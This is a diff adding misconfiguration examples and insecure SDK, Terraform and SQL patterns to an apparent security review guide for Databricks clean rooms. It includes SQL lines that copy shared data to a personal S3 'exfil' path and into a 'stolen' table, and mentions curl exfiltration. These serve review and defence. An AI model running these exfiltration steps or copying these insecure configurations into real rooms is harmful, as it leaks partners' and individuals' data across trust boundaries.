@@ -33,6 +33,118 @@ The unsafe assumption is that joining organizations trust each other enough to s
 | **External locations** | Unapproved cloud storage mounts writable from inside the room |
 | **Notebook exports** | Results copied to personal workspace or DBFS paths outside the room boundary |
 
+## Misconfiguration Examples
+
+Use these when reviewing clean room JSON specs, Databricks workspace settings, and participant onboarding—not as templates for production rooms.
+
+### Example 1: SELECT * join across contributor tables
+
+```json
+{
+  "query_template": "SELECT a.*, b.* FROM {{provider.customers}} a JOIN {{consumer.purchases}} b ON a.id = b.customer_id"
+}
+```
+
+Both parties' raw columns leave the room when output restrictions are absent or weak.
+
+### Example 2: No output restrictions block
+
+```json
+{
+  "name": "partner_analysis",
+  "clean_room_rules": [{ "name": "overlap", "query_template": "SELECT ..." }]
+}
+```
+
+No `minimum_group_size`, `maximum_rows`, or download blocks—small-group re-identification is possible.
+
+### Example 3: All participants are admins
+
+```json
+{
+  "participants": [
+    { "name": "retailer", "role": "admin" },
+    { "name": "brand", "role": "admin" }
+  ]
+}
+```
+
+Either party may edit rules, add collaborators, or widen queries without dual control.
+
+### Example 4: Sub-threshold aggregate export
+
+```sql
+SELECT user_id, email, SUM(revenue) AS total
+FROM shared_catalog.clean_room.events
+GROUP BY user_id, email
+HAVING COUNT(*) >= 1;
+```
+
+Group size of one reveals individual-level rows when output validation is missing.
+
+### Example 5: Shared admin PAT across rooms
+
+One personal access token runs jobs for multiple clean rooms with different data classifications—cross-room credential bleed.
+
+## SDK/IaC Sinks and Dangerous Patterns
+
+### Databricks SDK / REST (Python)
+
+```python
+from databricks.sdk import WorkspaceClient
+client = WorkspaceClient(host=host, token=os.environ["DATABRICKS_ADMIN_PAT"])
+client.clean_rooms.create(name="room", ...)  # admin PAT in app tier
+run = client.clean_rooms.run_now(room_id=room_id, rule_name=rule)
+rows = run.result().as_dict()["rows"]  # no app-layer output validation
+```
+
+Also review: `databricks-cli` tokens in CI, `dbutils.secrets.get` vs hardcoded tokens, SQL warehouse queries bypassing room boundary.
+
+### Java (Databricks SDK)
+
+```java
+WorkspaceClient client = WorkspaceClient.builder()
+    .host(cfg.host())
+    .token(System.getenv("DATABRICKS_ADMIN_PAT"))
+    .build();
+client.cleanRooms().runs().submit(roomId, jobSpec);
+return run.output().download();  // no tenant routing check
+```
+
+### Terraform (Databricks provider)
+
+```hcl
+resource "databricks_clean_room" "room" {
+  name = "partner_room"
+  # missing output_restriction blocks in provider schema mapping
+}
+resource "databricks_secret_scope" "shared" {
+  # one scope, one token, all rooms
+}
+```
+
+Also review: `databricks_permissions`, `databricks_sql_permissions`, cluster policies allowing arbitrary mount paths.
+
+### SQL / notebook sinks (inside room)
+
+```sql
+COPY INTO 's3://personal-bucket/exfil/' FROM (SELECT * FROM ...);
+CREATE TABLE personal_schema.stolen AS SELECT * FROM clean_room.shared_view;
+```
+
+Also review: `%sh` curl exfil, `displayHTML`, external locations writable from cluster identity.
+
+### C# / REST
+
+```csharp
+var client = new DatabricksClient(host, Configuration["Databricks:AdminToken"]);
+await client.Sql.StatementExecution.ExecuteAsync(warehouseId,
+    "SELECT * FROM clean_room.shared_events");
+await blobClient.UploadAsync(resultBytes);  // outside audit boundary
+```
+
+See [Databricks SDK for Python](https://databricks-sdk-py.readthedocs.io/en/latest/), [Clean room rules](https://docs.databricks.com/en/clean-rooms/clean-room-rules.html), and [Terraform Databricks provider](https://registry.terraform.io/providers/databricks/databricks/latest/docs).
+
 ## Sample Vulnerable Configuration in Python
 
 Use SDK or REST review scripts in CI to catch clean room definitions that omit output restrictions before deployment.
